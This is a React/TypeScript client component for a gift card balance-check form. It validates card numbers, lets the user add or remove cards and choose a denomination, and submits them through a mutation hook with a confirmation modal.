"use client";

import { useState } from "react";
import { Loader2 } from "lucide-react";

import GiftCardItem from "./GiftCardItem";
import DenominationSelector from "./DenominationSelector";
import BalanceConfirmModal from "./GiftCardBalanceModal";
import { GiftCard } from "./types";
import { Payload, useGiftCardCheck } from "@/hooks/useGiftCardCheck";
import { toast } from "sonner";

type CardErrors = {
  cardNumber?: string;

  // pin?: string;
};
interface Props {
  onSubmit: (data: {
    cards: GiftCard[];
    denomination: number | null;
  }) => Promise<any> | void;
  onCancel: () => void;
}

export default function GiftCardBalanceForm({ onSubmit, onCancel }: Props) {
  const [cards, setCards] = useState<GiftCard[]>([
    {
      id: Date.now(),
      cardNumber: "",
      // pin: "",
      // noPin: false,
    },
  ]);

  const [denomination, setDenomination] = useState<number | null>(null);
  const [denominationError, setDenominationError] = useState("");
  const [successModal, setSuccessModal] = useState(false);
  const [errors, setErrors] = useState<Record<number, CardErrors>>({});

  const { mutate, isPending } = useGiftCardCheck();

const handleChange = (
  id: number,
  field: keyof GiftCard,
  value: string | boolean,
) => {
  // 1. update cards
  setCards((prev) =>
    prev.map((card) =>
      card.id === id
        ? { ...card, [field]: value }
        : card
    )
  );

  // 2. validate using updated value
  setErrors((prev) => {
  const copy = { ...prev };

  const updatedCards = cards.map((c) =>
    c.id === id ? { ...c, [field]: value } : c
  );

  const card = updatedCards.find((c) => c.id === id);
  if (!card) return copy;

  const number = card.cardNumber.trim();

  if (!number) {
    copy[id] = { cardNumber: "Card number is required." };
  } else if (!/^X[A-Za-z0-9]{15}$/.test(number)) {
    copy[id] = {
      cardNumber: "Card number must start with X and be 16 characters.",
    };
  } else {
    // ✅ THIS is what makes error disappear at 16 chars
    delete copy[id];
  }

  return copy;
});
};


  const addCard = () => {
    setCards((prev) => [
      ...prev,
      {
        id: Date.now() + Math.random(),
        cardNumber: "",
        // pin: "",
        // noPin: false,
      },
    ]);
  };

  const removeCard = (id: number) => {
    setCards((prev) => prev.filter((card) => card.id !== id));

    setErrors((prev) => {
      const copy = { ...prev };
      delete copy[id];
      return copy;
    });
  };

  const validate = () => {
    const newErrors: Record<number, CardErrors> = {};

    cards.forEach((card) => {
      const cardError: CardErrors = {};

      const number = card.cardNumber.trim();

     if (!number) {
  cardError.cardNumber = "Card number is required.";
} else if (!/^X[A-Za-z0-9]{15}$/.test(number)) {
  cardError.cardNumber = "Card number must start with X and be 16 characters.";
}

      // if (!card.noPin) {
      //   const pin = card.pin.trim();

      //   if (!pin) {
      //     cardError.pin = "PIN is required.";
      //   } else if (!/^\d{4,8}$/.test(pin)) {
      //     cardError.pin = "PIN must be 4–8 digits.";
      //   }
      // }

      if (Object.keys(cardError).length > 0) {
        newErrors[card.id] = cardError;
      }
    });

    setErrors(newErrors);

    return Object.keys(newErrors).length === 0;
  };
  const handleSubmit = () => {
    setDenominationError("");

    if (!denomination) {
      setDenominationError("Please select a gift card value.");
      return;
    }

    if (!validate()) return;

    confirmSubmit();
  };

 const confirmSubmit = () => {
  const payload: Payload = {
    denomination,
    cards: cards.map((c) => ({
      cardNumber: c.cardNumber,
      pin: "",        // or real value if you enable it later
      noPin: true,    // or your logic
    })),
  };

  mutate(payload, {
    onSuccess: () => setSuccessModal(true),
    onError: (error: any) => {
      toast.error(error?.message || "Something went wrong. Please try again.");
    },
  });
};
  return (
    <>
      <div className="bg-white">
        <div className="mx-auto w-full  overflow-hidden rounded-3xl bg-white ">
          {/* Header */}
          <div className="border-b px-5 py-8 text-center sm:px-8 lg:px-16">
            <h1 className="text-2xl font-bold text-gray-900 sm:text-3xl lg:text-4xl">
              Check Your Gift Card Balance
            </h1>

            <p className="mx-auto mt-4 max-w-3xl text-sm text-gray-500 sm:text-base">
              Enter one or more gift card numbers below to instantly check
              available balances.
            </p>
          </div>

          {/* Body */}
          <div className="grid grid-cols-1 lg:grid-cols-2">
            {/* Left */}
            <div className="flex flex-col items-center bg-white pt-8 ">
              {/* Heading */}
              <div className="w-full text-center">
                <h2 className="text-base lg:text-3xl font-extrabold uppercase tracking-wide text-[#1B2559] sm:text-4xl">
                  Where to Find Your Card Number
                </h2>

                <p className="mt-2 text-sm lg:text-base text-gray-500 sm:text-lg">
                  The card number is used to check your gift card balance.
                </p>
              </div>

              {/* Image */}
              <div className="mt-4 w-full max-w-4xl ">
                <img
                  src="/images/card1.png"
                  alt="Gift Card"
                  className="block w-full h-auto"
                />
              </div>
            </div>

            {/* Right */}
            <div className="flex items-center justify-center px-4 py-8 sm:pr-8 lg:pr-32">
              <div className="w-full  space-y-6">
                <DenominationSelector
                  value={denomination}
                  onChange={(value) => {
                    setDenomination(value);
                    setDenominationError("");
                  }}
                />

                {denominationError && (
                  <p className="text-sm text-red-500">{denominationError}</p>
                )}

                <div className="space-y-5">
                  {cards.map((card, index) => (
                    <GiftCardItem
                      key={card.id}
                      index={index}
                      card={card}
                      errors={errors[card.id]}
                      onChange={handleChange}
                      onRemove={removeCard}
                      canRemove={cards.length > 1}
                    />
                  ))}
                </div>

                <button
                  type="button"
                  onClick={addCard}
                  className="w-full rounded-xl border border-dashed border-gray-300 py-4 text-sm font-medium text-gray-600 transition hover:border-black hover:text-black"
                >
                  + Add Another Gift Card
                </button>

                <div className="flex flex-col-reverse gap-3 sm:flex-row sm:justify-end">
                  <button
                    type="button"
                    onClick={onCancel}
                    className="w-full rounded-lg px-6 py-3 text-sm text-gray-700 transition hover:bg-gray-100 sm:w-auto"
                  >
                    Cancel
                  </button>

                  <button
                    type="button"
                    onClick={handleSubmit}
                    disabled={isPending}
                    className={`flex w-full items-center justify-center gap-2 rounded-lg px-6 py-3 text-sm font-semibold text-white transition sm:w-auto ${
                      isPending
                        ? "cursor-not-allowed bg-gray-400"
                        : "bg-black hover:bg-gray-900"
                    }`}
                  >
                    {isPending && <Loader2 className="h-4 w-4 animate-spin" />}

                    {isPending ? "Checking..." : "Check Balance"}
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <BalanceConfirmModal
        open={successModal}
        amount={denomination}
        onClose={() => {
          setSuccessModal(false);

          onSubmit?.({
            cards,
            denomination,
          });

          onCancel();
        }}
      />
    </>
  );
}
